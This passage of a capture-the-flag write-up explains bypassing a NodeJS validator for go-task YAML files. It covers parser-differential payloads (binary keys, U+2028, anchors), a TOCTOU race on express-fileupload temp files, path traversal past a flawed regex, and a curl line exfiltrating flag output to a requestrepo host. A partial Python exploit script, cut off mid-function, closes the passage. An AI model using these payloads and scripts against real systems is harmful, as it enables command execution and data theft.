</span></span><span class=line><span class=cl>    <span class=nt>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Check if a server is reachable using ICMP ping.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;icon&#34;</span><span class=p>:</span> <span class=s2>&#34;fa-wifi&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;content&#34;</span><span class=p>:</span> <span class=s2>&#34;version: 3\ntasks:\n  task:\n    cmds:\n      - ping -c {{ n }} &#39;{{ host }}&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;placeholders&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;host&#34;</span><span class=p>:</span> <span class=s2>&#34;8.8.8.8&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;n&#34;</span><span class=p>:</span> <span class=s2>&#34;2&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;cmdregex&#34;</span> <span class=p>:</span> <span class=s2>&#34;^ping -c \\d &#39;([A-z0-9\\-_\\.]+)&#39;$&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>The <code>cmdregex</code> field is a regex that is used to validate the command in the YAML file, and it is used in the <code>checkTask()</code> function to ensure that the command matches one of the templates. The regex is used to prevent ACE and they&rsquo;re not too broken on all the templates.</p><h2 class="relative group">Unintended Solutions: NodeJS-Go Parsing Differentials<div id=unintended-solutions-nodejs-go-parsing-differentials class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#unintended-solutions-nodejs-go-parsing-differentials aria-label=Anchor>#</a></span></h2><p>The <code>checkTask()</code> function is also pretty restrictive. However, that validation happens on the NodeJS side. Then, as said, the task is executed using the <code>go-task</code> external binary, and as the name suggests, it is written in Go. Guess what? As almost everything in computers, people define standards for complex operations, such as parsing YAML files (or parsing anything in general), and people basically do the fuck they want anyway. In fact, every web CTF player or websec guy, has at least one time exploited some kind of discrepancy e.g. between a &ldquo;front-end&rdquo; reverse proxy that proxies to an &ldquo;upstream&rdquo; backend server, allowing for so called HTTP smuggling or HTTP desync attacks. To be honest, not all the &ldquo;non standard compliant&rdquo; behaviour are intended, and most of them are just bugs. Many others also are caused by intrinsic behaviour of the programming language, as it happens for this challenge.<br><em>Moral of the story: when some sort of validation happens in framework/language X and then the same content is juggled to another framework/language Y, it should tickle your antennas</em>.</p><p>At the time of solving this challenge, indeed, I searched for recent researches of such discrepancies on YAML parsers and I actually found many interesting blogs and videos, among them:</p><ul><li><a href=https://youtu.be/Dq_KVLXzxH8 target=_blank rel=noreferrer>OffensiveCon25 - Joernchen - Parser Differentials: When Interpretation Becomes a Vulnerability</a></li><li><a href=https://gitlab-com.gitlab.io/gl-security/security-tech-notes/security-research-tech-notes/devfile/ target=_blank rel=noreferrer>Joernchen - Devfile file write vulnerability in GitLab</a></li><li><a href=https://gist.github.com/taramtrampam/fca4e599992909b48a3ba1ce69e215a2 target=_blank rel=noreferrer>taramtrampam - &ldquo;Safe&rdquo; YAML monster</a></li></ul><p>A more general research on different Go parsers was recently released by TrailOfBits <a href=https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/ target=_blank rel=noreferrer>here</a>.</p><p><strong>The idea is now clear, upload a YAML that looks safe to the NodeJS parser but then evaluates to something else when executed by the <code>go-task</code> binary</strong>. The most common approach is using the same &ldquo;key&rdquo; multiple times in the same document. While it&rsquo;s not a valid document, many parsers accept it but results can be different.</p><h3 class="relative group"><code>!!binary</code> tag and duplicate keys (by @Val)<div id=binary-tag-and-duplicate-keys-by-val class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#binary-tag-and-duplicate-keys-by-val aria-label=Anchor>#</a></span></h3><p>An example is using the <code>!!binary</code> tag to define a binary string, where the decoded value is the same as the string representation of another key. This evaluates, based on who is parsing it, either in: <strong>1)</strong> two different keys, one with the binary value and one with the string value; <strong>2)</strong> a duplicate key of the same name, that could overwrite the previous value for example.<br>Many players did solve using this approach indeed, see the following solve by <a href=https://discord.com/channels/1248313330410459186/1251873089005027328/1381248912848851025 target=_blank rel=noreferrer>@Val</a></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>version</span><span class=p>:</span><span class=w> </span><span class=m>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nt>tasks</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>task</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>cmds</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>/readflag</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=cp>!!binary</span><span class=w> </span><span class=nt>dGFzaw==</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>cmds</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>echo &#39;hello world!&#39;</span></span></span></code></pre></div></div><p>What happens here is that the <strong>NodeJS parser fully supports the binary-encoded keys</strong> and evaluates the <code>!!binary dGFzaw==</code> key to <code>task</code> and then collapses the duplicated entry to a single one, resulting in the <code>echo 'hello world!'</code> command. <strong>On the <code>go-task</code> side, instead, Go is happy with &ldquo;multiple same keys&rdquo; during validation as it compares <code>task</code> and <code>dGFzaw==</code> (not decoded keys)</strong>. Although the YAML spec ‚ÄúMUST‚Äù flag duplicate keys as an error, <a href=https://github.com/go-yaml/yaml target=_blank rel=noreferrer>go-yaml v3</a> (which is a dependency of go-task) instead keeps them (<a href=https://github.com/go-yaml/yaml/issues/623 target=_blank rel=noreferrer>an issue</a> is open regarding this). Finally, when <code>go-task</code> executes the task, it executes the <code>/readflag</code> command, because it appears first in the tasks list.</p><h3 class="relative group">Unicode escape sequences (by @Alemmi, @sebstr, @pysu)<div id=unicode-escape-sequences-by-alemmi-sebstr-pysu class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#unicode-escape-sequences-by-alemmi-sebstr-pysu aria-label=Anchor>#</a></span></h3><p>Another approach by <a href=https://discord.com/channels/1248313330410459186/1251873089005027328/1381249400298274917 target=_blank rel=noreferrer>@Alemmi</a> was to use Unicode escape sequences:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>version</span><span class=p>:</span><span class=w> </span><span class=m>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nt>tasks</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>task</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>cmds</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>echo &#39;hello\u2028    preconditions:\u2028      - /readflag \u2028      - aaa&#39;</span></span></span></code></pre></div></div><p>This works because the <strong>NodeJS YAML parser does not treat the <code>\u2028</code> (line separator) as a line break (correctly following YAML 1.2 specs, since 1.2 dropped support for <code>U+2028</code> as a line-break character, it treats the glyph just like any other character in the string), while <code>go-task</code> relies on Go‚Äôs <a href=https://github.com/go-yaml/yaml target=_blank rel=noreferrer>go-yaml v3</a>, which still implements the older YAML 1.1 rules</strong>. In YAML 1.1 <code>U+2028</code> is still considered a legal line-break byte. The <code>/readflag</code> command now sits in a <code>precondition</code>, which go-task runs before the echo command.</p><p>A quite similar solution by <a href=https://discord.com/channels/1248313330410459186/1251873089005027328/1381249318022811768 target=_blank rel=noreferrer>@sebstr</a> and <a href=https://discord.com/channels/1248313330410459186/1251873089005027328/1381250685680488530 target=_blank rel=noreferrer>@pysu</a>, instead, was to use carriage return line endings because they are treated as non-breaking characters. This is contrary to the YAML spec, which explicitly calls out CR, LF and CRLF as the (only) possible line breaks. Again, an issue about that is open on the <code>eemeli/yaml</code> repository <a href=https://github.com/eemeli/yaml/issues/595 target=_blank rel=noreferrer>here</a>.</p><h3 class="relative group">YAML&rsquo;s Anchors and Aliases (my solution)<div id=yamls-anchors-and-aliases-my-solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#yamls-anchors-and-aliases-my-solution aria-label=Anchor>#</a></span></h3><p>My solution was a bit different:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>version</span><span class=p>:</span><span class=w> </span><span class=m>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nt>tasks</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=cp>&amp;k</span><span class=w> </span><span class=s2>&#34;task&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>cmds</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;/readflag&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>?</span><span class=w> </span><span class=cp>*k</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>:</span><span class=w>  </span><span class=nt>cmds</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>echo &#39;node&#39;</span></span></span></code></pre></div></div><p>Ok, what&rsquo;s going on there?<br>The <code>&amp;k</code> syntax defines an &ldquo;anchor&rdquo; for the <code>task</code> key, which can be referenced later using the <code>*k</code> syntax (alias). <strong>What happens is that the NodeJS parser resolves the alias before it inserts the keys, so both entries become the JavaScript string <code>"task"</code>, and as previously occurred, the NodeJS parser collapses the two entries into a single one, keeping the last (safe) value. On the go-task side, as before, the parser is happy with the duplicate keys, executing the first one in the list</strong>.</p><p>Upload and execute whichever YAML monster you like the most and we get the flag :)</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=flag src=./img/unintended_flag.png></figure></p><p>Another possible solution was to use the YAML&rsquo;s <code>&lt;&lt;</code> merge operator, but I didn&rsquo;t manage to make it work.</p><h2 class="relative group">Intended Solution: TOCTOU race condition in <code>checkTask()</code> by leveraging <code>express-fileupload</code> tempFiles<div id=intended-solution-toctou-race-condition-in-checktask-by-leveraging-express-fileupload-tempfiles class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#intended-solution-toctou-race-condition-in-checktask-by-leveraging-express-fileupload-tempfiles aria-label=Anchor>#</a></span></h2><p>The actual intended solution turns out to be a race condition in the <code>/execute</code> endpoint by leveraging the <code>express-fileupload</code> temporary files, which is a bit more elaborate and complex solution than the previous one. I was indeed surprised to know that this was the actual intended solution, which, btw, I think it&rsquo;s a super cool primitive on Express.<br>How does that work? Remember when I said to keep in mind the <code>express-fileupload</code> options? Well, <strong>the <code>useTempFiles</code> option instructs <code>express-fileupload</code> to stream incoming files directly to disk</strong> rather than loading them fully into memory, to avoid memory issues with large file uploads. That being said, we know that when uploading a YAML task file, express will create a temp file under <code>/tmp</code> and store for a brief moment the file stream here until the HTTP request completes.<br>How could we exploit this? Imagine we could stop time in a specific moment of the file upload, while still being able to resume that upload later. If we could do that, we could upload a partial &ldquo;safe&rdquo; YAML file, like a simple <code>echo 'hello world!'</code> command, then call the <code>/execute</code> endpoint on the created temp file, and just as the <code>checkTask()</code> function validates the &ldquo;safe&rdquo; YAML file, we could then resume the upload by completing the YAML file with a malicious task (e.g. <code>/readflag</code>) and because the <code>go-task</code> process takes the filename as argument, it will execute the malicious task, effectively bypassing the checks. This is what&rsquo;s called a <strong>TOCTOU (Time-of-check to time-of-use) race condition</strong>. Check the screenshot below where I&rsquo;ve highlighted the race window.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=TOCTOU src=./img/intended_TOCTOU.png></figure></p><p>But hey, obviously we have some issues here. First of all, we can&rsquo;t stop time, and hitting such a small race window (before the tempFile gets deleted) by matching it with <code>/execute</code> execution during the file upload seems like a big gamble. Secondly, the <code>/execute</code> endpoint expects a task UUID, and the temp files generated by <code>express-fileupload</code> are of the form <code>tmp-&lt;n_upload>-&lt;ms_timestamp></code>, where <code>&lt;n_upload></code> is a number that increments with each upload and <code>&lt;ms_timestamp></code> is the timestamp in milliseconds when the upload started, therefore it won&rsquo;t go past the regex at <code>L163</code>.<br>How do we cope with these?</p><ol><li><code>express-fileupload</code> streams the file to disk in chunks until the given <code>content-length</code> is reached or once it gets the end boundary in case of a multipart upload. This means we could send a very large <code>content-length</code> header, and then upload a small chunk of data, which will be written to the temp file while still having the server waiting for the whole body to be sent, i.e. leaving the partial file written to disk for a while until we send all the bytes the server is expecting. This makes our race much more feasible. Actually we could just use <code>Transfer-Encoding: chunked</code> and don&rsquo;t close the end boundary until we want.</li><li>The validating regex at <code>L163</code> is flawed. It doesn&rsquo;t correctly define start/end of line boundaries (<code>^</code>, <code>$</code>), meaning any matching 36-chars substring will pass the check. In other words, if we send <code>../../../../../../&lt;whatever-36-bytes-long-dir>/../../../../../../../tmp/&lt;tempFile></code>, the regex will match the <code>&lt;whatever-36-bytes-long-filename></code> substring and consider it valid; that path however will finally evaluate to the <code>/tmp/&lt;tempFile></code> file, effectively bypassing the regex.</li></ol><p>That exploitation path works, we will just need to guess the <code>tmp-&lt;n_upload>-&lt;ms_timestamp></code> filename, which is not too hard to do, since we can use the <code>/check</code> endpoint as oracle to see if a file exists or not, and just spin a small brute. We also need to hit the TOCTOU race window by resuming the upload in the exact moment the <code>checkTask()</code> function has validated the safe file, but we can just spam a bunch of <code>/execute</code> requests and eventually one will hit the race window.</p><p>We got this. Let&rsquo;s recap our plan:</p><ol><li>Upload our exploit YAML file up to a &ldquo;safe&rdquo; point, e.g. until a <code>cmds: - echo 'im safe'</code>, while keeping the connection open</li><li>Guess the tempfile generated by <code>express-fileupload</code> using the <code>/check</code> endpoint as oracle</li><li>Spam the <code>/execute</code> endpoint with the retrieved temp file AND at the same time release the upload connection by letting it complete the YAML task file with a malicious command, e.g. <code>cmds: - /readflag</code> and pray that one of the <code>/execute</code> requests will hit the race window.</li></ol><p>Here&rsquo;s the &ldquo;safe&rdquo; YAML file that becomes malicious once fully completed:</p><p><strong>safe.yaml</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>version</span><span class=p>:</span><span class=w> </span><span class=m>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nt>tasks</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>task</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>cmds</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>echo &#39;safe until here&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>/readflag | curl -X POST -d @- https://m0zdqazr.requestrepo.com/flag</span></span></span></code></pre></div></div><p>And here there&rsquo;s my solve script that implements the above plan:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;http://127.0.0.1:3001&#34;</span>
</span></span><span class=line><span class=cl><span class=n>LOGIN_ENDPOINT</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/api/login&#34;</span>
</span></span><span class=line><span class=cl><span class=n>UPLOAD_ENDPOINT</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/api/upload?template=echo&#34;</span>
</span></span><span class=line><span class=cl><span class=n>CHECK_ENDPOINT</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/api/check&#34;</span>
</span></span><span class=line><span class=cl><span class=n>EXECUTE_ENDPOINT</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/api/execute&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start_exploit_event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>resume_upload_event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>upload_completed_event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>chunked_body_generator</span><span class=p>(</span><span class=n>file</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>first_chunk_size</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>boundary</span> <span class=o>=</span> <span class=s2>&#34;----palleboundary&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=sa>f</span><span class=s2>&#34;--</span><span class=si>{</span><span class=n>boundary</span><span class=si>}</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=sa>f</span><span class=s1>&#39;Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;</span><span class=si>{</span><span class=n>file</span><span class=si>}</span><span class=s1>&#34;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=sa>b</span><span class=s2>&#34;Content-Type: application/x-yaml</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>first_chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>yield</span> <span class=n>data</span> <span class=c1># return first chunk</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] first chunk sent, waiting for resume event...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>start_exploit_event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>resume_upload_event</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span> <span class=c1># wait for resume event</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] resume event received, continuing upload...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>yield</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> <span class=c1># return the rest of the file</span>
</span></span><span class=line><span class=cl>        <span class=k>yield</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>yield</span> <span class=sa>f</span><span class=s2>&#34;--</span><span class=si>{</span><span class=n>boundary</span><span class=si>}</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=c1># end of chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_and_keep_conn_open</span><span class=p>(</span><span class=n>session</span><span class=p>:</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>,</span> <span class=n>file</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>n_bytes</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Cookie&#34;</span><span class=p>:</span> <span class=n>session</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;user_id&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;x-start-time&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s2>&#34;%H:%M:%S GMT&#34;</span><span class=p>,</span> <span class=n>time</span><span class=o>.</span><span class=n>gmtime</span><span class=p>())),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;multipart/form-data; boundary=----palleboundary&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1># use urllib3 because python-requests will buffer the body</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>urllib3</span><span class=o>.</span><span class=n>PoolManager</span><span class=p>()</span><span class=o>.</span><span class=n>request</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>UPLOAD_ENDPOINT</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>body</span><span class=o>=</span><span class=n>chunked_body_generator</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>n_bytes</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>chunked</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#assert r.status == 200, &#34;Upload failed&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>resume_upload</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># TOCTOU here by completing the yaml upload with a malicious task just after the safe tasks check finishes </span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] finished doing silly things, resuming upload...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resume_upload_event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>  <span class=c1># signal to resume the upload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>session</span><span class=p>:</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>,</span> <span class=n>upload_timestamp</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>start_exploit_event</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span> <span class=c1># wait for the upload to send the first chunk</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] doing silly things while upload connection is open...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># find the tempFile created by express-fileupload</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] searching for the temp file...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>target_tmp_file</span> <span class=o>=</span> <span class=n>find_temp_file</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>upload_timestamp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># execute the temp file with path traversal and a matching 36 chars filename to bypass UUID regex check</span>
</span></span><span class=line><span class=cl>    <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>spam_execute</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>target_tmp_file</span><span class=p>),</span> <span class=n>daemon</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># give some time for the execute thread to start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_temp_file</span><span class=p>(</span><span class=n>session</span><span class=p>:</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>,</span> <span class=n>upload_timestamp_ms</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># express-fileupload creates a temp file of the form:</span>
</span></span><span class=line><span class=cl>    <span class=c1># /tmp/tmp-&lt;n_upload&gt;-&lt;ms_timestamp&gt;</span>
</span></span><span class=line><span class=cl>    <span class=c1># where &lt;n_upload&gt; is a number that increments with each upload</span>
</span></span><span class=line><span class=cl>    <span class=c1># and &lt;ms_timestamp&gt; is the timestamp in milliseconds when the upload started</span>
</span></span><span class=line><span class=cl>    <span class=c1># we can guess the temp file name by iterating over possible values</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>n_upload</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>250</span><span class=p>):</span> <span class=c1># assuming a max of 250 uploads in the server among all users</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span> <span class=c1># assuming a max of 500 ms overhead for the upload</span>
</span></span><span class=line><span class=cl>            <span class=n>guess_file_name</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;tmp-</span><span class=si>{</span><span class=n>n_upload</span><span class=si>}</span><span class=s2>-</span><span class=si>{</span><span class=n>upload_timestamp_ms</span> <span class=o>+</span> <span class=n>t</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=c1># path traversal with a 36 chars directory inside to bypass the UUID regex check</span>
</span></span><span class=line><span class=cl>            <span class=n>target_tmp_file</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;../../../../../../app/frontend/node_modules/json-stable-stringify-without-jsonify/../../../../../../../tmp/</span><span class=si>{</span><span class=n>guess_file_name</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] guessing temp file name: </span><span class=si>{</span><span class=n>guess_file_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># we use the check endpoint as oracle to check if the file exists based on the response status code</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>CHECK_ENDPOINT</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span> <span class=n>target_tmp_file</span><span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>404</span><span class=p>:</span>
